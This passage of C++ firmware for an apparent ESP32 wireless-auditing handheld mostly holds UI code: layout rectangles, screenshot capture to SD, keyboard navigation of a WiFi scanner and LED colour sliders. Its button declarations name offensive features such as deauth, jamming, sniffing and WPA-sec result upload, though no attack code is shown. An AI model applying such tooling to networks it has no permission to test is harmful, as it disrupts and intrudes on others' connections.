static void applyFontMono() { applyFont(g_ui ? g_ui->font_mono : nullptr, g_ui ? g_ui->text_size_sm : 1); }
static void drawCyberBackdrop();

struct UiRect {
  int x;
  int y;
  int w;
  int h;
};

struct UiPanel {
  UiRect frameRect;
  UiRect contentRect;
};

static inline int uiScreenW() { return tft.width(); }
static inline int uiScreenH() { return tft.height(); }
static inline int uiHeaderBandH() {
  return g_ui ? g_ui->header_h : ((uiScreenH() <= 180) ? 18 : 30);
}
static inline int uiTopBarH() { return uiHeaderBandH(); }
static inline int uiActionDockSafeLeft() {
  return max(0, ActionDockBoxX - ActionDock_CLEARANCE_PX);
}
static inline int uiActionDockSafeRight() {
  return min(uiScreenW(), ActionDockBoxX + ActionDockBoxW + ActionDock_CLEARANCE_PX);
}
static inline int uiActionDockSafeBottom() {
  return min(uiScreenH(), ActionDockBoxY + ActionDockBoxH + ActionDock_CLEARANCE_PX);
}
static inline bool uiIntersectsActionDockBand(int y, int h) {
  const int safeTop = max(0, ActionDockBoxY - ActionDock_CLEARANCE_PX);
  const int safeBottom = uiActionDockSafeBottom();
  return (y < safeBottom) && ((y + h) > safeTop);
}
static inline int uiRightLimitForBand(int y, int h) {
  const int fullRight = uiScreenW() - UI_SAFE_MARGIN;
  if (uiIntersectsActionDockBand(y, h)) {
    return min(fullRight, uiActionDockSafeLeft());
  }
  return fullRight;
}

static UiRect computeBottomBarRect() {
  const int w = uiScreenW();
  const int h = uiScreenH();
  UiRect r{UI_SAFE_MARGIN, h - UI_BOTTOM_BAR_H, w - (UI_SAFE_MARGIN * 2), UI_BOTTOM_BAR_H};
  return r;
}

static UiRect computeContentRect() {
  const int w = uiScreenW();
  UiRect bar = computeBottomBarRect();
  const int y0 = uiTopBarH() + UI_TOP_GAP;
  UiRect r{UI_SAFE_MARGIN, y0, w - (UI_SAFE_MARGIN * 2), (bar.y - UI_TOP_GAP) - y0};
  if (r.h < 0) r.h = 0;
  return r;
}

static bool pointInRect(int px, int py, const UiRect& r) {
  return (px >= r.x && px < (r.x + r.w) && py >= r.y && py < (r.y + r.h));
}

static UiRect uiInsetRect(const UiRect& r, int left, int top, int right, int bottom) {
  UiRect out{r.x + left, r.y + top, r.w - (left + right), r.h - (top + bottom)};
  if (out.w < 0) out.w = 0;
  if (out.h < 0) out.h = 0;
  return out;
}

static UiPanel uiMakePanel(const UiRect& frame, int left, int top, int right, int bottom) {
  UiPanel p{frame, uiInsetRect(frame, left, top, right, bottom)};
  return p;
}

static void beginPanelContent(const UiPanel& panel) {
#if defined(NEONDRIVE_USES_M5GFX)
  tft.setClipRect(panel.contentRect.x, panel.contentRect.y, panel.contentRect.w, panel.contentRect.h);
#else
  tft.setViewport(panel.contentRect.x, panel.contentRect.y, panel.contentRect.w, panel.contentRect.h);
#endif
}

static void endPanelContent() {
#if defined(NEONDRIVE_USES_M5GFX)
  tft.clearClipRect();
#else
  tft.resetViewport();
#endif
}

static void drawTextClipped(const String& input, int x, int y, int maxW, uint16_t fg, uint16_t bg, bool ellipsis = false) {
  if (maxW <= 0) return;
  String s = input;
  if (ellipsis) {
    while (s.length() > 4 && tft.textWidth(s + "...") > maxW) s.remove(s.length() - 1);
    if (s != input && tft.textWidth(s + "...") <= maxW) s += "...";
  } else {
    while (s.length() > 1 && tft.textWidth(s) > maxW) s.remove(s.length() - 1);
  }
  tft.setTextColor(fg, bg);
  tft.drawString(s, x, y);
}

static bool uiRectsIntersect(const UiRect& a, const UiRect& b) {
  return !(a.x + a.w <= b.x || b.x + b.w <= a.x || a.y + a.h <= b.y || b.y + b.h <= a.y);
}

static UiRect buttonRect(const Button& b) {
  return UiRect{b.x, b.y, b.w, b.h};
}

static void layoutBottomButtons(Button* out, const char* const* labels, int count) {
  UiRect bar = computeBottomBarRect();
  if (!out || !labels || count <= 0) return;
  const int totalGap = UI_BUTTON_GAP * (count - 1);
  const int btnW = (bar.w - totalGap) / count;
  for (int i = 0; i < count; i++) {
    out[i] = {bar.x + i * (btnW + UI_BUTTON_GAP), bar.y, btnW, UI_BUTTON_H, labels[i]};
  }
}

static void drawUniversalBackground() {
  drawCyberBackdrop();
}

static void uiLogLayout(const char* tag, const UiRect& content, const UiRect& bottom) {
  UI_LOGF("[ui] %s screen=%s w=%d h=%d content=(%d,%d,%d,%d) bottom=(%d,%d,%d,%d) ActionDock=(%d,%d,%d,%d)\n",
          tag ? tag : "layout",
          screenToStr(screen),
          uiScreenW(), uiScreenH(),
          content.x, content.y, content.w, content.h,
          bottom.x, bottom.y, bottom.w, bottom.h,
          ActionDockBoxX, ActionDockBoxY, ActionDockBoxW, ActionDockBoxH);
}

static void uiLogButtonRect(const char* label, const Button& b) {
  UI_LOGF("[ui] btn '%s' rect=(%d,%d,%d,%d)\n",
          label ? label : "(null)", b.x, b.y, b.w, b.h);
}

static void drawHeaderTitleOverlay() {
  if (!currentHeaderTitle || currentHeaderTitle[0] == '\0') return;
  layoutActionDockBox();
  tft.setTextDatum(TL_DATUM);
#if defined(NEONDRIVE_TARGET_CYD24)
  applyFontMd();
#else
  applyFontLg();
#endif
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  String headerTitle = String(currentHeaderTitle);
  const int maxTitleW = uiActionDockSafeLeft() - 8;
  if (maxTitleW > 8) {
    while (headerTitle.length() > 3 && tft.textWidth(headerTitle) > maxTitleW) {
      headerTitle.remove(headerTitle.length() - 1);
    }
    if (headerTitle != String(currentHeaderTitle) && headerTitle.length() > 3) {
      headerTitle.remove(headerTitle.length() - 3);
      headerTitle += "...";
    }
  }
  tft.drawString(headerTitle, 8, 8);
}

static void drawHeader(const char* title) {
  layoutActionDockBox();
  currentHeaderTitle = title;
  const int headerBandH = uiHeaderBandH();
  tft.fillRect(0, 0, tft.width(), headerBandH, TFT_BLACK);
  drawHeaderTitleOverlay();

  // Companion Sync badge (may be cleared/redrawn elsewhere; draw once on header paints too)
  // Keep it subtle and non-invasive in the header region.
  const uint32_t now = millis();
  const bool companionActive = (companionSyncUntilMs != 0) && ((int32_t)(companionSyncUntilMs - now) > 0);
  const int badgeX = 8;
  const int badgeY = headerBandH - 14;
  const int badgeH = 12;
  const int badgeMaxW = uiActionDockSafeLeft() - badgeX;
  const int badgeW = (badgeMaxW > 150) ? 150 : badgeMaxW;
  if (badgeW > 60) {
    if (companionActive) {
      tft.fillRoundRect(badgeX, badgeY, badgeW, badgeH, 3, TFT_DARKGREY);
      tft.drawRoundRect(badgeX, badgeY, badgeW, badgeH, 3, TFT_MAGENTA);
      tft.setTextDatum(TL_DATUM);
      applyFontSm();
      tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
      tft.drawString("Companion Sync", badgeX + 6, badgeY + 2);
      companionSyncBadgeWasDrawn = true;
    } else if (companionSyncBadgeWasDrawn) {
      tft.fillRect(badgeX, badgeY, badgeW, badgeH, TFT_BLACK);
      companionSyncBadgeWasDrawn = false;
    }
  }

  drawBorder();
}

static void drawCompanionSyncBadgeTick() {
  const uint32_t now = millis();
  const bool companionActive = (companionSyncUntilMs != 0) && ((int32_t)(companionSyncUntilMs - now) > 0);

  layoutActionDockBox();
  const int headerBandH = uiHeaderBandH();
  const int badgeX = 8;
  const int badgeY = headerBandH - 14;
  const int badgeH = 12;
  const int badgeMaxW = uiActionDockSafeLeft() - badgeX;
  const int badgeW = (badgeMaxW > 150) ? 150 : badgeMaxW;
  if (badgeW <= 60) return;

  if (companionActive) {
    tft.fillRoundRect(badgeX, badgeY, badgeW, badgeH, 3, TFT_DARKGREY);
    tft.drawRoundRect(badgeX, badgeY, badgeW, badgeH, 3, TFT_MAGENTA);
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
    tft.drawString("Companion Sync", badgeX + 6, badgeY + 2);
    companionSyncBadgeWasDrawn = true;
  } else if (companionSyncBadgeWasDrawn) {
    tft.fillRect(badgeX, badgeY, badgeW, badgeH, TFT_BLACK);
    companionSyncBadgeWasDrawn = false;
  }
}

static Button homeBtns[HOME_BTN_COUNT];

// ── Keyboard focus state (Cardputer) ─────────────────────────────────────────
#if ND_HW_KEYBOARD
static int  g_focusIdx          = 0;   // focused button index on HOME screen
#endif

// ---------- Home -> Targets smart flow (Milestone D v6) ----------
static bool homeTargetsPromptActive = false;
static bool homeReconnectPromptActive = false;
static Button btnHomePromptYes, btnHomePromptNo;

static Button btnBack, btnSave;

// ── Screenshot (Cardputer Tab key) ───────────────────────────────────────────
#if ND_HW_KEYBOARD
#include <PNGenc.h>
#undef local  // zutil.h (pulled in by PNGenc) defines 'local' as 'static'; conflicts with variable names below
#endif

#if ND_HW_KEYBOARD
static void setScreen(ScreenId next);  // forward declaration
static void drawWifiScan();             // forward declaration (used by handleKeyNavWifiScan)

static void takeScreenshot() {
  if (!sdReady && !mountSdCard(false)) {
    Serial.println("[snap] SD not ready");
    return;
  }

  const int W = ND_DISPLAY_W;
  const int H = ND_DISPLAY_H;

  // ── Encode into a RAM buffer ──────────────────────────────────────────────
  // PNGenc's file-based mode requires seekable R/W access to back-patch the
  // IDAT chunk size — SD FILE_WRITE doesn't support that.
  // RAM mode encodes fully in memory, then we write the completed buffer to SD.
  // 240×135×3 raw = 97 KB; at level-3 compression screen content typically
  // compresses to ~25-45 KB. 80 KB gives comfortable headroom.
  const int SNAP_BUF = 80 * 1024;
  uint8_t *pngBuf = (uint8_t*)malloc(SNAP_BUF);
  if (!pngBuf) {
    Serial.printf("[snap] OOM (%d bytes needed)\n", SNAP_BUF);
    return;
  }

  // PNGENC is ~20 KB — static to avoid stack overflow.
  static PNGENC png;
  int rc = png.open(pngBuf, SNAP_BUF);
  if (rc != PNG_SUCCESS) {
    free(pngBuf);
    Serial.printf("[snap] PNGenc open error %d\n", rc);
    return;
  }

  rc = png.encodeBegin(W, H, PNG_PIXEL_TRUECOLOR, 24, nullptr, 3);
  if (rc != PNG_SUCCESS) {
    free(pngBuf);
    Serial.printf("[snap] PNGenc begin error %d\n", rc);
    return;
  }

  // addRGB565Line converts RGB565→RGB24 internally (pTempLine = scratch).
  uint16_t row_rgb565[W];
  uint8_t  row_tmp[W * 3];

  for (int y = 0; y < H; y++) {
    tft.readRect(0, y, W, 1, row_rgb565);
    if (png.addRGB565Line(row_rgb565, row_tmp) != PNG_SUCCESS) break;
  }

  int encoded = png.close();  // returns total bytes written to pngBuf
  Serial.printf("[snap] encoded %d bytes\n", encoded);

  // ── Write buffer to SD ────────────────────────────────────────────────────
  if (encoded > 0) {
    if (!SD.exists("/screenshots")) SD.mkdir("/screenshots");

    static int snap_n = 0;
    char fname[36];
    snprintf(fname, sizeof(fname), "/screenshots/snap_%04d.png", snap_n++);

    File f = SD.open(fname, FILE_WRITE);
    if (f) {
      f.write(pngBuf, (size_t)encoded);
      f.close();
      Serial.printf("[snap] saved %s\n", fname);
    } else {
      Serial.printf("[snap] open failed: %s\n", fname);
    }
  }

  free(pngBuf);

  // Invert-flash feedback, then restore the screen.
  tft.invertDisplay(true);
  delay(80);
  tft.invertDisplay(false);
  setScreen(screen);
}
#endif // ND_HW_KEYBOARD

// ── Keyboard navigation helpers (Cardputer) ──────────────────────────────────
// Placed here so all referenced globals (homeBtns, synth touch vars, btnBack)
// are already declared above. setScreen forward-declared in takeScreenshot block above.
#if ND_HW_KEYBOARD

// Draw (or erase) the focus ring for the currently focused HOME button.
// Call after drawHome() to stamp the initial ring, and after focus changes.
static void drawFocusRing() {
  if (screen != ScreenId::HOME) return;
  if (g_focusIdx < 0 || g_focusIdx >= HOME_BTN_COUNT) return;
  const Button& b = homeBtns[g_focusIdx];
  if (b.label == nullptr || b.label[0] == '\0' || b.w == 0) return;
  // drawHomeButton renders at 95% of the cell — the 5% margin is free for the ring.
  tft.drawRect(b.x, b.y, b.w, b.h, TFT_WHITE);
}

// Move focus to newIdx, refreshing only the two affected button cells.
static void updateHomeFocus(int newIdx) {
  if (g_focusIdx >= 0 && g_focusIdx < HOME_BTN_COUNT) {
    const Button& ob = homeBtns[g_focusIdx];
    if (ob.w > 0) {
      tft.fillRect(ob.x, ob.y, ob.w, ob.h, TFT_BLACK);
      drawHomeButton(ob, homeBtnBorderColor(g_focusIdx), TFT_WHITE);
    }
  }
  g_focusIdx = newIdx;
  if (g_focusIdx >= 0 && g_focusIdx < HOME_BTN_COUNT) {
    const Button& nb = homeBtns[g_focusIdx];
    if (nb.w > 0) {
      tft.fillRect(nb.x, nb.y, nb.w, nb.h, TFT_BLACK);
      drawHomeButton(nb, homeBtnBorderColor(g_focusIdx), TFT_WHITE);
      drawFocusRing();
    }
  }
}

// Process a key event from neon_hal_key_get().
// WiFi Scanner keyboard navigation (Cardputer-only).
// UP/DOWN scrolls the network list; Enter/Right sets the selected network as
// target and navigates to CONFIRM_TARGET; 'S' triggers a fresh scan; Back goes home.
#if defined(NEONDRIVE_TARGET_M5CARDPUTER)
static void handleKeyNavWifiScan(const neon_key_t& k) {
  auto runWifiScanAndRestore = [&]() {
    wifiSnapshotPrimedByBssid();
    wifiIsScanning = true;
    drawWifiScan();
    doWifiScanBlocking();
    wifiIsScanning = false;
    wifiRestorePrimedByBssid();
    if (apSelected >= apCount) apSelected = apCount - 1;
    drawWifiScan();
  };

  if (k.key == NeonKey::BACK) {
    setScreen(ScreenId::HOME);
    return;
  }
  if (k.key == NeonKey::UP) {
    if (apCount > 0) {
      apSelected = (apSelected <= 0) ? 0 : apSelected - 1;
      drawWifiScan();
    }
    return;
  }
  if (k.key == NeonKey::DOWN) {
    if (apCount > 0) {
      apSelected = (apSelected < apCount - 1) ? apSelected + 1 : apCount - 1;
      drawWifiScan();
    }
    return;
  }
  if (k.key == NeonKey::ENTER) {
    if (apSelected >= 0 && apSelected < apCount) {
      target    = aps[apSelected];
      hasTarget = true;
      lockChannel = cfg.wifi_defaultLockChannel;
      setScreen(ScreenId::CONFIRM_TARGET);
    }
    return;
  }
  if (k.key == NeonKey::CHAR) {
    const char c = k.ch | 0x20;   // to lowercase
    if (c == 'b') { setScreen(ScreenId::HOME); return; }
    if (c == 's') { runWifiScanAndRestore(); return; }
    if (c == 'c') {
      if (apSelected < 0 || apSelected >= apCount) return;
      const ApRecord& selectedAp = aps[apSelected];
      wifiConnectSelectedIdx = apSelected;
      wifiConnectSsid = selectedAp.ssid.isEmpty() ? "(hidden)" : selectedAp.ssid;
      wifiConnectNeedsPassword = (selectedAp.auth != WIFI_AUTH_OPEN);
      wifiConnectRevealPassword = false;
      wifiConnectShowSavedDrawer = false;
      wifiConnectShowPasswordModal = false;
      wifiConnectPassword = wifiConnectNeedsPassword && (cfg.wifi_ssid == selectedAp.ssid) ? cfg.wifi_password : "";
      setScreen(ScreenId::WIFI_CONNECT);
      return;
    }
    if (c == 't') {
      if (apSelected >= 0 && apSelected < apCount) {
        target = aps[apSelected];
        hasTarget = true;
        lockChannel = cfg.wifi_defaultLockChannel;
      }
      setScreen(ScreenId::TARGET_DETAILS);
      return;
    }
    if (c == 'a') {
      if (apSelected >= 0 && apSelected < apCount) {
        target = aps[apSelected];
        hasTarget = true;
        lockChannel = cfg.wifi_defaultLockChannel;
      }
      setScreen(ScreenId::TARGET_DETAILS);
      return;
    }
    return;
  }
}
#endif  // NEONDRIVE_TARGET_M5CARDPUTER

// HOME: arrows move focus, Enter fires focused button, Back is no-op (already home).
// Other screens: Back returns to HOME, Enter fires the Back button.
static void handleKeyNav(neon_key_t k) {
  if (k.key == NeonKey::SCREENSHOT) {
    takeScreenshot();
    return;
  }
#if defined(NEONDRIVE_TARGET_M5CARDPUTER)
  if (screen == ScreenId::WIFI_SCAN) {
    handleKeyNavWifiScan(k);
    return;
  }
  if (screen == ScreenId::WIFI_CONNECT) {
    auto connectSelectedAp = [&]() {
      if (wifiConnectSelectedIdx >= 0 && wifiConnectSelectedIdx < apCount) {
        const ApRecord& selectedAp = aps[wifiConnectSelectedIdx];
        if (selectedAp.auth == WIFI_AUTH_OPEN) connectToWifi(selectedAp.ssid, "");
        else connectToWifi(selectedAp.ssid, wifiConnectPassword);
        drawWifiConnect();
      }
    };
    if (k.key == NeonKey::CHAR) {
      const char lower = k.ch | 0x20;
      const bool upperAction = (k.ch >= 'A' && k.ch <= 'Z');
        if (upperAction) {
        if (lower == 'b') { setScreen(ScreenId::WIFI_SCAN); return; }
        if (lower == 'x') { wifiConnectPassword = ""; drawWifiConnect(); return; }
        if (lower == 'r') {
          if (!cfg.wifi_ssid.isEmpty()) {
            wifiConnectPassword = cfg.wifi_password;
            connectToWifi(cfg.wifi_ssid, cfg.wifi_password);
            wifiConnectStatus = "Reconnecting saved network";
          } else if (cfg.wifi_savedCount > 0) {
            connectToWifi(cfg.wifi_savedSsid[0], cfg.wifi_savedPassword[0]);
            wifiConnectStatus = "Reconnecting saved[0]";
          } else {
            wifiConnectStatus = "No saved network";
          }
          drawWifiConnect();
          return;
        }
        if (lower == 'c') {
          connectSelectedAp();
          return;
        }
      }
      if (wifiConnectPassword.length() < 63) wifiConnectPassword += k.ch;
      drawWifiConnect();
      return;
    }
    if (k.key == NeonKey::BACK) {
      setScreen(ScreenId::WIFI_SCAN);
      return;
    }
    if (k.key == NeonKey::ENTER) {
      connectSelectedAp();
      return;
    }
  }
  if (screen != ScreenId::HOME) {
    if (keyboardNavHandleArrowOrEnter(k)) return;
  }
#endif
  if (k.key == NeonKey::BACK) {
    if (screen != ScreenId::HOME) {
      setScreen(ScreenId::HOME);
      drawFocusRing();
    }
    return;
  }

  if (screen == ScreenId::HOME) {
    if (k.key == NeonKey::ENTER) {
      const Button& b = homeBtns[g_focusIdx];
      if (b.label && b.label[0] != '\0' && b.w > 0) {
        g_synthTouchPending = true;
        g_synthTouchX = b.x + b.w / 2;
        g_synthTouchY = b.y + b.h / 2;
      }
      return;
    }
    int next = g_focusIdx;
    if (k.key == NeonKey::LEFT)  next = max(0, g_focusIdx - 1);
    if (k.key == NeonKey::RIGHT) next = min(HOME_BTN_COUNT - 1, g_focusIdx + 1);
    if (k.key == NeonKey::UP)    next = max(0, g_focusIdx - HOME_BTN_COLS);
    if (k.key == NeonKey::DOWN)  next = min(HOME_BTN_COUNT - 1, g_focusIdx + HOME_BTN_COLS);
    // Skip empty slots when moving right or down
    if (k.key == NeonKey::RIGHT || k.key == NeonKey::DOWN) {
      while (next < HOME_BTN_COUNT &&
             (homeBtns[next].label == nullptr || homeBtns[next].label[0] == '\0')) {
        next++;
      }
      if (next >= HOME_BTN_COUNT) next = g_focusIdx;
    }
    if (next != g_focusIdx) updateHomeFocus(next);
    return;
  }

  // Non-HOME: Enter fires the Back button if one is visible on this screen.
  if (k.key == NeonKey::ENTER && btnBack.w > 0) {
    g_synthTouchPending = true;
    g_synthTouchX = btnBack.x + btnBack.w / 2;
    g_synthTouchY = btnBack.y + btnBack.h / 2;
  }
}
#endif // ND_HW_KEYBOARD

static Button btnWifiBack, btnWifiScan, btnWifiRescan, btnWifiTargetGo, btnWifiConnect;
static Button btnWifiUp, btnWifiDown;
static Button btnWifiYes, btnWifiNo;
static Button btnTargetBack, btnTargetAutomate, btnTargetMonitor, btnTargetSniff, btnTargetLock;
static Button btnMonitorBack;
static Button btnMonitorPause, btnMonitorClear, btnMonitorAuto, btnMonitorFilter;
static Button btnMonitorTabLive, btnMonitorTabSd, btnMonitorTabLfs, btnMonitorTabView;
static Button btnAutoBack, btnAutoY0INK, btnAutoRAW, btnAutoSCOPE, btnAutoJAMMIT;
static Button btnMonitorUpDir, btnMonitorUp, btnMonitorDown;
// Just Go screen buttons
static Button btnJustGoBack, btnJustGoToggle, btnJustGoSpray;
static Button btnJustGoStayMinus, btnJustGoStayPlus;
static Button btnJustGoProfilePrev, btnJustGoProfileNext;

// WiFi Connect screen buttons
static Button btnWifiConnectBack, btnWifiConnectList[MAX_APS];
static Button btnWifiConnectScan, btnWifiConnectUp, btnWifiConnectDown;
static Button btnWifiConnectSubmit, btnWifiConnectDisconnect;
static Button btnWifiPwKeys[40];
static char wifiPwKeyLabels[40][2];
static char wifiPwKeyValues[40];
static int wifiPwKeyCount = 0;
static bool wifiPwShift = false;
static bool wifiPwSymbols = false;
static Button btnWifiPwShift;
static Button btnWifiPwMode;
static Button btnWifiPwBack;
static Button btnWifiPwSpace;
static Button btnWifiPwClear;
static Button btnWifiPwCancel, btnWifiPwConnect;
static Button btnWifiPwShowHide, btnWifiPwReconnect, btnWifiPwSaved;
static Button btnWifiSavedRows[AppConfig::MAX_SAVED_WIFI], btnWifiSavedClose;

// Webserver screen buttons  
static Button btnWebserverBack, btnWebserverStartAP, btnWebserverStartServer;
static Button btnWebserverStopServer;
static Button btnWebserverWpaSecSync, btnWebserverDownloadResults;
static Button btnCfgWifiConnect, btnCfgWebserver, btnCfgLed;
static Button btnCfgStartup, btnCfgTelemetry, btnCfgSync;
static Button btnSyncDropbox, btnSyncWpasec, btnSyncWigle;
static char   syncDropboxStatus[20] = {};

static int wifiListTopY = 92;
static int wifiListBottomY = 200;
static int wifiRowH = 34;
static int wifiListDrawX = 8;
static int wifiListDrawW = 120;
static Button btnWifiRows[4];
static Button btnWifiChecks[4];
static int wifiRadarX = 0, wifiRadarY = 0, wifiRadarW = 0, wifiRadarH = 0;

static Button btnHopMinus, btnHopPlus;
static Button btnScanMinus, btnScanPlus;
static Button btnDeauthToggle;
static Button btnWifiDefaultLockToggle;
static Button btnCfgWifi;
static Button btnStartupAutoReconnect, btnStartupDefaultLockToggle, btnStartupHypercube, btnStartupWebserver, btnStartupAutoRotate, btnStartupManualRotation;
static Button btnTelemetryMinus, btnTelemetryPlus, btnTelemetryVerboseToggle;
static Button btnMonitorTab1, btnMonitorTab2;
#if defined(NEONDRIVE_TARGET_M5TAB5)
static Button btnTab5Screenshot;
static uint32_t tab5ScreenshotToastUntilMs = 0;
static bool tab5ScreenshotToastOk = false;
static char tab5ScreenshotLastPath[48] = {0};
#endif
static Button btnReconBack, btnReconModeDeauth, btnReconModePort;
static Button btnReconStart, btnReconClear;
static Button btnReconChMinus, btnReconChPlus, btnReconLock;
static Button btnReconPortStartStop, btnReconPortExport;
static Button btnPSBack, btnPSStart, btnPSMode, btnPSExport, btnPSClr, btnPSFiles, btnPSDeep;
static Button btnPSScrollUp, btnPSScrollDown;
static Button btnReconHomeDeauth, btnReconHomeNetScan, btnReconHomeAnalyze, btnReconHomeBack;
static Button btnReconPortUp, btnReconPortDown;
#if defined(NEONDRIVE_TARGET_CYD)
static const char* cydRotationLabel(int r);
static void applyCydManualRotation(int rotation, bool redraw);
#endif
static Button btnScopeBack, btnScopeRefresh;

static ScreenId monitorReturnScreen = ScreenId::TARGET_DETAILS;
static constexpr int MONITOR_FILE_MAX = 24;
struct MonitorFileEntry {
  char name[40];
  uint32_t size;
  bool isDir;
};
static MonitorFileEntry monitorFiles[MONITOR_FILE_MAX];
static int monitorFileCount = 0;
static int monitorFileScroll = 0;
static char monitorFilePath[96] = "/";
static char monitorFileInfo[80] = "";
static uint32_t monitorFileLastRefreshMs = 0;
static int monitorFileListX = 0;
static int monitorFileListY = 0;
static int monitorFileListW = 0;
static int monitorFileListH = 0;
static int monitorFileRowH = 14;
static int monitorFileVisibleRows = 0;
static bool monitorFileUseSd = true;
static char monitorSdPath[96] = "/";
static char monitorLfsPath[96] = "/";
static char monitorViewPath[128] = "";
static bool monitorViewUseSd = true;
static int monitorViewScroll = 0;
static char monitorViewLines[32][96];
static int monitorViewLineCount = 0;

// LED Control state (buttons are local to reduce DRAM)
static uint8_t ledBrightness = 128;
static uint8_t ledRed = 255, ledGreen = 0, ledBlue = 0;
static uint16_t ledHue = 0;
static bool ledHueInitialized = false;
static bool ledSliderDraggingHue = false;
static bool ledSliderDraggingBrightness = false;

// LED slider layout (sized for 320x240 landscape CYD)
static constexpr int LED_SLIDER_X = 12;
static constexpr int LED_SLIDER_W = 188;
static constexpr int LED_SLIDER_H = 16;
static constexpr int LED_HUE_Y = 126;
static constexpr int LED_BRIGHTNESS_Y = 174;
static constexpr int LED_PREVIEW_X = 212;
static constexpr int LED_PREVIEW_Y = 120;
static constexpr int LED_PREVIEW_W = 96;
static constexpr int LED_PREVIEW_H = 96;

static uint16_t rgbToHue(uint8_t r, uint8_t g, uint8_t b) {
  float rf = (float)r / 255.0f;
  float gf = (float)g / 255.0f;
  float bf = (float)b / 255.0f;
  float maxv = fmaxf(rf, fmaxf(gf, bf));
  float minv = fminf(rf, fminf(gf, bf));
  float d = maxv - minv;
  if (d <= 0.00001f) return 0;

  float h = 0.0f;
  if (maxv == rf) {
    h = 60.0f * fmodf(((gf - bf) / d), 6.0f);
  } else if (maxv == gf) {
    h = 60.0f * (((bf - rf) / d) + 2.0f);
  } else {
    h = 60.0f * (((rf - gf) / d) + 4.0f);
  }
  if (h < 0.0f) h += 360.0f;
  uint16_t out = (uint16_t)(h + 0.5f);
  if (out >= 360) out = 0;
  return out;
}

static void hueToRgb(uint16_t hue, uint8_t& r, uint8_t& g, uint8_t& b) {
  float h = (float)(hue % 360) / 60.0f;
  float c = 1.0f;
  float x = c * (1.0f - fabsf(fmodf(h, 2.0f) - 1.0f));
  float rf = 0.0f, gf = 0.0f, bf = 0.0f;

  if (h < 1.0f)      { rf = c; gf = x; bf = 0.0f; }
  else if (h < 2.0f) { rf = x; gf = c; bf = 0.0f; }
  else if (h < 3.0f) { rf = 0.0f; gf = c; bf = x; }
  else if (h < 4.0f) { rf = 0.0f; gf = x; bf = c; }
  else if (h < 5.0f) { rf = x; gf = 0.0f; bf = c; }
  else               { rf = c; gf = 0.0f; bf = x; }

  r = (uint8_t)(rf * 255.0f + 0.5f);
  g = (uint8_t)(gf * 255.0f + 0.5f);
  b = (uint8_t)(bf * 255.0f + 0.5f);
}

static int ledSliderKnobX(int value, int minValue, int maxValue) {
  value = clampi(value, minValue, maxValue);
  long num = (long)(value - minValue) * (long)(LED_SLIDER_W - 1);
  long den = (long)(maxValue - minValue);
  if (den <= 0) den = 1;
  return LED_SLIDER_X + (int)(num / den);
}

static int ledMapTouchToValue(int touchX, int minValue, int maxValue) {
  int local = clampi(touchX - LED_SLIDER_X, 0, LED_SLIDER_W - 1);
  long num = (long)local * (long)(maxValue - minValue);
  long den = (long)(LED_SLIDER_W - 1);
  if (den <= 0) den = 1;
  return minValue + (int)((num + (den / 2)) / den);
}

static bool ledPointInSlider(int px, int py, int sliderY) {
  const int hitPadY = 10;
  return (px >= LED_SLIDER_X &&
          px < (LED_SLIDER_X + LED_SLIDER_W) &&
          py >= (sliderY - hitPadY) &&
          py <= (sliderY + LED_SLIDER_H + hitPadY));
}

static void ledEnsureHueInitialized() {
  if (ledHueInitialized) return;
  ledHue = rgbToHue(ledRed, ledGreen, ledBlue);
  ledHueInitialized = true;
}

static void ledUpdateRgbFromHue() {
  hueToRgb(ledHue, ledRed, ledGreen, ledBlue);
}

static bool ledSetHueFromTouchX(int touchX) {
  uint16_t nextHue = (uint16_t)ledMapTouchToValue(touchX, 0, 359);
  if (nextHue == ledHue) return false;
  ledHue = nextHue;
  ledUpdateRgbFromHue();
  return true;
}

static bool ledSetBrightnessFromTouchX(int touchX) {
  uint8_t nextBrightness = (uint8_t)ledMapTouchToValue(touchX, 0, 255);
  if (nextBrightness == ledBrightness) return false;
  ledBrightness = nextBrightness;
  return true;
}

static void drawHueSliderTrack() {
  for (int i = 0; i < LED_SLIDER_W; i++) {
    uint16_t h = (uint16_t)((i * 359L) / (LED_SLIDER_W - 1));
    uint8_t r, g, b;
    hueToRgb(h, r, g, b);
    tft.drawFastVLine(LED_SLIDER_X + i, LED_HUE_Y, LED_SLIDER_H, tft.color565(r, g, b));
  }
  tft.drawRect(LED_SLIDER_X - 1, LED_HUE_Y - 1, LED_SLIDER_W + 2, LED_SLIDER_H + 2, TFT_WHITE);
}

static void drawBrightnessSliderTrack() {
  uint8_t baseR, baseG, baseB;
  hueToRgb(ledHue, baseR, baseG, baseB);
  for (int i = 0; i < LED_SLIDER_W; i++) {
    uint8_t v = (uint8_t)((i * 255L) / (LED_SLIDER_W - 1));
    uint8_t r = (uint8_t)(((uint16_t)baseR * (uint16_t)v) / 255);
    uint8_t g = (uint8_t)(((uint16_t)baseG * (uint16_t)v) / 255);
    uint8_t b = (uint8_t)(((uint16_t)baseB * (uint16_t)v) / 255);
    tft.drawFastVLine(LED_SLIDER_X + i, LED_BRIGHTNESS_Y, LED_SLIDER_H, tft.color565(r, g, b));
  }
  tft.drawRect(LED_SLIDER_X - 1, LED_BRIGHTNESS_Y - 1, LED_SLIDER_W + 2, LED_SLIDER_H + 2, TFT_WHITE);
}

static void drawSliderKnob(int sliderY, int knobX) {
  int cy = sliderY + (LED_SLIDER_H / 2);
  tft.fillCircle(knobX, cy, 7, TFT_WHITE);
  tft.drawCircle(knobX, cy, 7, TFT_BLACK);
}

static void drawLedControlDynamic() {
  tft.setTextDatum(TL_DATUM);
  applyFontSm();

  // Slider labels and value readouts.
  const int hueLabelY = LED_HUE_Y - 18;
  const int briLabelY = LED_BRIGHTNESS_Y - 18;
  tft.fillRect(8, hueLabelY - 6, 200, 18, TFT_BLACK);
  tft.fillRect(8, briLabelY - 6, 200, 18, TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("Hue", 12, hueLabelY);
  tft.drawString("Brightness", 12, briLabelY);

  char val[32];
  tft.fillRect(134, hueLabelY, 74, 14, TFT_BLACK);
  snprintf(val, sizeof(val), "%3u deg", (unsigned)ledHue);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString(val, 136, hueLabelY);

  tft.fillRect(134, briLabelY, 74, 14, TFT_BLACK);
  snprintf(val, sizeof(val), "%3u", (unsigned)ledBrightness);
  tft.drawString(val, 136, briLabelY);

  // Slider tracks + knobs.
  drawHueSliderTrack();
